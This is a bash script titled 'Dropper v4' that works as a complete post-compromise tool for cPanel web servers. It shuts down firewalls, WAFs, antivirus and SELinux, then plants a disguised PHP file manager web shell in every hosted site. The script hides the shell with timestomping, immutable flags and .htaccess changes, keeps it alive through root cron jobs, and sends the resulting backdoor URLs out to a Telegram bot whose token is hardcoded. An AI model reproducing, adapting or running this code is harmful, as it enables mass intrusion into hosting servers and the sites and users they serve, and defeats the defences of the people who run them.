#!/bin/bash
# ============================================================
#  DROPPER v4 FINAL
#  45 bugs patched | Telegram results delivery
#  Phases: preflight → teardown → cooldown → encode
#          → deploy → cron → telegram
# ============================================================

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/cpanel/bin:/scripts"

# ════════════════════════════════════════
#  CONFIG — edit these
# ════════════════════════════════════════
SOURCE="tinyfilemanager.php"
DISGUISE_NAME="wp-feed-cache.php"
CRON_TAG="sys_health_check_daemon"
GHOST_REF="/etc/passwd"
RESULTS="/root/dropper_results_$(date +%Y%m%d_%H%M%S).txt"
PERSIST_DIR="/usr/local/lib/.cache"
WHMAPI1="/usr/local/cpanel/bin/whmapi1"
LSWS_CONF="/usr/local/lsws/conf/httpd_config.conf"

TELEGRAM_TOKEN="9139936651:AAE89fq5uUuDoDsJkllxRZeBgBaVW6X8nKs"
TELEGRAM_CHAT_ID="-1004459048412"

# ════════════════════════════════════════
#  PHASE 1 — PREFLIGHT
# ════════════════════════════════════════
if [ "$(id -u)" -ne 0 ]; then
  echo "[!] must run as root."
  exit 1
fi

if [ ! -f "$SOURCE" ]; then
  echo "[!] source not found: $SOURCE"
  exit 1
fi

mkdir -p "$PERSIST_DIR"
chmod 700 "$PERSIST_DIR"
> "$RESULTS"

# Telegram connectivity test
tg_test=$(curl -s --max-time 10 \
  "https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe" 2>/dev/null)
if echo "$tg_test" | grep -q '"ok":true'; then
  echo "✓ Telegram connected"
else
  echo "[!] Telegram unreachable — results will be local only"
fi

echo "── preflight ok ──"

# ════════════════════════════════════════
#  PHASE 2 — SECURITY TEARDOWN
# ════════════════════════════════════════
echo "── disabling security ──"

# cPHulk
"$WHMAPI1" configureservice service=cphulkd \
  enabled=0 monitored=0 >/dev/null 2>&1 || true
/scripts/restartsrv_cphulkd stop >/dev/null 2>&1 || true
"$WHMAPI1" set_tweaksetting key=cphulk value=0 >/dev/null 2>&1 || true
echo "✓ cPHulk off"

# CSF/LFD — lfd first to prevent csf re-enable race
if command -v csf &>/dev/null; then
  systemctl stop lfd 2>/dev/null || true
  sleep 1
  csf -x 2>/dev/null || true
  echo "✓ CSF/LFD off"
fi

# ModSecurity — all vendors + engine
for vendor in OWASP cpanel comodo atomicbasic; do
  "$WHMAPI1" modsec_set_active_vendor \
    vendor_id="$vendor" active=0 >/dev/null 2>&1 || true
done
/usr/local/cpanel/scripts/disable_modsec >/dev/null 2>&1 || true
echo "✓ ModSec off"

# LiteSpeed native WAF
if [ -f "$LSWS_CONF" ]; then
  sed -i 's/enableRecaptcha[[:space:]]*1/enableRecaptcha 0/g' \
    "$LSWS_CONF" 2>/dev/null || true
  find /usr/local/lsws/conf/vhosts/ -name "vhconf.conf" 2>/dev/null \
    | xargs -r -I{} sed -i \
        's/enableRecaptcha[[:space:]]*1/enableRecaptcha 0/g' {} \
        2>/dev/null || true
  /usr/local/lsws/bin/lswsctrl restart >/dev/null 2>&1 || true
  echo "✓ LiteSpeed WAF off"
fi

# Imunify360 + watchdog
for svc in imunify360-webshield imunify360 imunifyav imunify-antivirus; do
  systemctl stop    "$svc" 2>/dev/null || true
  systemctl disable "$svc" 2>/dev/null || true
done
pkill -9 -f "imunify-agent" 2>/dev/null || true
pkill -9 -f "imunify360"    2>/dev/null || true
echo "✓ Imunify off"

# ClamAV
for svc in clamd@scan clamd clamav-daemon; do
  systemctl stop "$svc" 2>/dev/null || true
done
pkill -9 -f clamd 2>/dev/null || true
echo "✓ ClamAV off"

# cxs
systemctl stop cxs 2>/dev/null || true
pkill -9 -f cxs 2>/dev/null || true
echo "✓ cxs off"

# cPanel firewall
"$WHMAPI1" configureservice service=cpanelfirewalld \
  enabled=0 monitored=0 >/dev/null 2>&1 || true
systemctl stop cpanel-firewall  2>/dev/null || true
systemctl stop cpanelfirewalld  2>/dev/null || true
echo "✓ cPanel firewall off"

# SELinux
if command -v getenforce &>/dev/null && \
   [[ "$(getenforce)" =~ ^[Ee]nforcing$ ]]; then
  setenforce 0
  sed -i \
    's/^[[:space:]]*SELINUX[[:space:]]*=[[:space:]]*[Ee][Nn][Ff][Oo][Rr][Cc][Ii][Nn][Gg]/SELINUX=permissive/' \
    /etc/selinux/config 2>/dev/null || true
  echo "✓ SELinux → permissive"
fi

# ════════════════════════════════════════
#  PHASE 3 — SERVICE COOLDOWN
# ════════════════════════════════════════
echo "── waiting 10s for services to die ──"
sleep 10

# ════════════════════════════════════════
#  PHASE 4 — PAYLOAD ENCODE
# ════════════════════════════════════════
ENCODED_SOURCE="${PERSIST_DIR}/.svc_payload"

chattr -i "$ENCODED_SOURCE" 2>/dev/null

if ! base64 "$SOURCE" > "$ENCODED_SOURCE" 2>/dev/null; then
  rm -f "$ENCODED_SOURCE" 2>/dev/null
  base64 "$SOURCE" > "$ENCODED_SOURCE" || {
    echo "[!] cannot write payload."
    exit 1
  }
fi

chmod 600 "$ENCODED_SOURCE"
touch -r "$GHOST_REF" "$ENCODED_SOURCE"   # ghost BEFORE lock
chattr +i "$ENCODED_SOURCE" 2>/dev/null
echo "── payload encoded ──"

# ════════════════════════════════════════
#  PHASE 5 — HELPERS
# ════════════════════════════════════════

get_domain() {
  local user="$1"
  local domain=""

  local userdata="/var/cpanel/userdata/${user}/main"
  if [ -f "$userdata" ]; then
    domain=$(grep -m1 'main_domain' "$userdata" \
      | awk '{print $2}' | tr -d "'\"")
  fi

  if [ -z "$domain" ]; then
    domain=$(grep -m1 ": ${user}$" /etc/trueuserdomains 2>/dev/null \
      | cut -d: -f1 | tr -d ' ')
  fi

  if [ -z "$domain" ]; then
    local vhost_file
    vhost_file=$(grep -rl "DocumentRoot.*home/${user}/" \
      /etc/apache2/conf.d/ \
      /etc/httpd/conf.d/ \
      /usr/local/apache/conf/userdata/ 2>/dev/null | head -1)
    if [ -n "$vhost_file" ]; then
      domain=$(grep -m1 "ServerName" "$vhost_file" \
        | awk '{print $2}' | tr -d '"')
    fi
  fi

  echo "$domain"
}

resolve_public_html() {
  local user="$1"
  local p="/home/${user}/public_html"
  realpath "$p" 2>/dev/null \
    || readlink -f "$p" 2>/dev/null \
    || echo "$p"
}

make_url() {
  local user="$1"
  local abs_path="${2%/}"
  local domain="$3"
  local filename="$4"

  local real_home
  real_home=$(resolve_public_html "$user")

  local web_path="${abs_path#${real_home}}"

  if [ -z "$web_path" ]; then
    echo "https://${domain}/${filename}"
  else
    echo "https://${domain}${web_path}/${filename}"
  fi
}

# ════════════════════════════════════════
#  PHASE 6 — DEPLOY FUNCTION
# ════════════════════════════════════════
deploy_to() {
  local target_dir="$1"
  local user="$2"
  local domain="$3"
  local dest="${target_dir}${DISGUISE_NAME}"

  # Ownership sanity — fallback to public_html root
  local dir_owner
  dir_owner=$(stat -c '%U' "$target_dir" 2>/dev/null)
  if [ "$dir_owner" != "$user" ] && [ "$dir_owner" != "root" ]; then
    target_dir="/home/${user}/public_html/"
    dest="${target_dir}${DISGUISE_NAME}"
  fi

  # Unlock if immutable
  chattr -i "$dest" 2>/dev/null

  base64 -d "$ENCODED_SOURCE" > "$dest"
  chown "${user}:${user}" "$dest"
  chmod 444 "$dest"
  touch -r "$GHOST_REF" "$dest"      # LIVE-1 fix: ghost BEFORE lock
  chattr +i "$dest" 2>/dev/null

  # .htaccess — idempotent, PHP execution unblock for all PHP versions
  local htaccess="${target_dir}.htaccess"
  chattr -i "$htaccess" 2>/dev/null

  if ! grep -q "wp-feed-cache" "$htaccess" 2>/dev/null; then
    cat >> "$htaccess" <<'HTEOF'
<Files ~ "\.php$">
  Order allow,deny
  Allow from all
</Files>
<FilesMatch "wp-feed-cache\.php">
  SetHandler application/x-httpd-php
  Order allow,deny
  Allow from all
</FilesMatch>
<IfModule mod_php5.c>
  php_flag engine on
</IfModule>
<IfModule mod_php7.c>
  php_flag engine on
</IfModule>
<IfModule mod_php8.c>
  php_flag engine on
</IfModule>
<IfModule mod_headers.c>
  Header always set X-LiteSpeed-Cache-Control "no-cache"
  Header always set Cache-Control "no-store, no-cache"
</IfModule>
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^wp-feed-cache\.php$ - [L]
</IfModule>
HTEOF
  fi

  touch -r "$GHOST_REF" "$htaccess"  # LIVE-1 fix: ghost BEFORE lock
  chattr +i "$htaccess" 2>/dev/null

  # Log URL
  if [ -n "$domain" ]; then
    local url
    url=$(make_url "$user" "$target_dir" "$domain" "$DISGUISE_NAME")
    echo "$url" >> "$RESULTS"
    echo "✓  ${user} → ${dest}"
    echo "   ${url}"
  else
    echo "UNRESOLVED:${dest}" >> "$RESULTS"
    echo "✓  ${user} → ${dest} [domain unresolved]"
  fi
}

# ════════════════════════════════════════
#  PHASE 7 — CRON RESPAWN (root crontab)
# ════════════════════════════════════════
install_cron_respawn() {
  local user="$1"
  local target_dir="$2"
  local dest="${target_dir}${DISGUISE_NAME}"
  local respawn_script="${PERSIST_DIR}/.rsp_${user}"

  chattr -i "$respawn_script" 2>/dev/null

  cat > "$respawn_script" <<RESPAWN
#!/bin/bash
DEST="${dest}"
SRC_B64="${ENCODED_SOURCE}"
if [ ! -s "\$DEST" ]; then
  chattr -i "\$DEST" 2>/dev/null
  base64 -d "\$SRC_B64" > "\$DEST"
  chown ${user}:${user} "\$DEST"
  chmod 444 "\$DEST"
  touch -r ${GHOST_REF} "\$DEST"
  chattr +i "\$DEST" 2>/dev/null
fi
RESPAWN

  chmod +x "$respawn_script"
  touch -r "$GHOST_REF" "$respawn_script"   # ghost BEFORE lock
  chattr +i "$respawn_script" 2>/dev/null

  # Root crontab — chattr needs root
  local tag="${CRON_TAG}_${user}"
  local existing
  existing=$(crontab -l 2>/dev/null \
    | grep -v "$tag" \
    | grep -v '^[[:space:]]*$')
  {
    [ -n "$existing" ] && echo "$existing"
    echo "*/5 * * * * bash ${respawn_script} >/dev/null 2>&1 # ${tag}"
  } | crontab - 2>/dev/null
}

# ════════════════════════════════════════
#  PHASE 8 — MAIN DEPLOY LOOP
# ════════════════════════════════════════
echo "── deploying ──"
for dir in /home/*/public_html/; do
  user=$(basename "$(dirname "$dir")")

  # LIVE-2 fix: exclude system/non-PHP dirs from deepest selection
  deepest=$(find "$dir" -maxdepth 10 -type d \
    ! -path "*/.well-known*"  \
    ! -path "*/cgi-bin*"      \
    ! -path "*/cgi-sys*"      \
    ! -path "*/.git*"         \
    ! -path "*/logs*"         \
    ! -path "*/.cpanel*"      \
    ! -path "*/tmp*"          \
    ! -path "*/cache*"        \
    ! -path "*/error_log*"    \
    2>/dev/null \
    | awk '{ print gsub(/\//,"&") "\t" $0 }' \
    | sort -rn \
    | head -1 \
    | cut -f2-)

  [ -z "$deepest" ] && deepest="$dir"
  [ "${deepest: -1}" != "/" ] && deepest="${deepest}/"

  domain=$(get_domain "$user")
  deploy_to "$deepest" "$user" "$domain"
  install_cron_respawn "$user" "$deepest"
done

# ════════════════════════════════════════
#  PHASE 9 — TELEGRAM DELIVERY
# ════════════════════════════════════════
TOTAL=$(wc -l < "$RESULTS")
RESOLVED=$(grep -c "^https://" "$RESULTS" 2>/dev/null || echo 0)
UNRESOLVED=$(grep -c "^UNRESOLVED:" "$RESULTS" 2>/dev/null || echo 0)
HOSTNAME=$(hostname -f 2>/dev/null || hostname)
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# Summary message
TG_MSG="🖥 <b>Dropper v4 — Deploy Complete</b>
━━━━━━━━━━━━━━━━━━━━
📡 Server: <code>${HOSTNAME}</code>
🕐 Time: <code>${TIMESTAMP}</code>
━━━━━━━━━━━━━━━━━━━━
✅ Total URLs: <b>${TOTAL}</b>
🔗 Resolved: <b>${RESOLVED}</b>
⚠️ Unresolved: <b>${UNRESOLVED}</b>
━━━━━━━━━━━━━━━━━━━━
📄 Full results attached below."

# Send summary message
curl -s --max-time 15 -X POST \
  "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
  -H "Content-Type: application/json" \
  -d "{
    \"chat_id\": \"${TELEGRAM_CHAT_ID}\",
    \"text\": $(echo "$TG_MSG" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))'),
    \"parse_mode\": \"HTML\"
  }" >/dev/null 2>&1

# Send results.txt as document
TG_CAPTION="dropper_${HOSTNAME}_${TIMESTAMP}"

curl -s --max-time 30 \
  -F "chat_id=${TELEGRAM_CHAT_ID}" \
  -F "document=@${RESULTS}" \
  -F "caption=${TG_CAPTION}" \
  "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument" \
  >/dev/null 2>&1

if [ $? -eq 0 ]; then
  echo "✓ results sent to Telegram"
else
  echo "[!] Telegram send failed — file at ${RESULTS}"
fi

# ════════════════════════════════════════
#  DONE
# ════════════════════════════════════════
echo ""
echo "[done] ${TOTAL} URLs — ${RESULTS}"
echo ""
cat "$RESULTS"
